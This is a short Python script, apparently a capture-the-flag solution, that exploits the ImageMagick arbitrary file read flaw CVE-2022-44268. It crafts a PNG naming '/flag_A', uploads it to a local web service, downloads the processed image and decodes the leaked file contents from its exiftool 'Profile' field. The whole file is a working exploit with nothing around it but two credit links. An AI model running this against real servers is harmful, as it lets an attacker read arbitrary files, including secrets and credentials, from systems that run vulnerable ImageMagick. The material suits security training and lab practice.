# Script-credit to @SloppyJoePirates

# https://github.com/Sybil-Scan/imagemagick-lfi-poc
# https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC

import requests
import os 
import shutil
import subprocess

url = "http://localhost:80"

os.system(f"python3 generate.py -f '/flag_A' -o exploit.png")

r = requests.post(f"{url}/create", files={'file':open("exploit.png",'rb')}, allow_redirects=False)

r = requests.get(f"{url}{r.headers.get('location')}", stream=True)
with open('out.png', 'wb') as out_file:
    shutil.copyfileobj(r.raw, out_file)

response = subprocess.check_output("exiftool out.png | grep 'Profile'", shell=True).strip(b"\n").decode()
print(response)

out = ""
for chunk in response.split(" ")[-1].split("."):
    out += bytes.fromhex(chunk).decode()
print(out)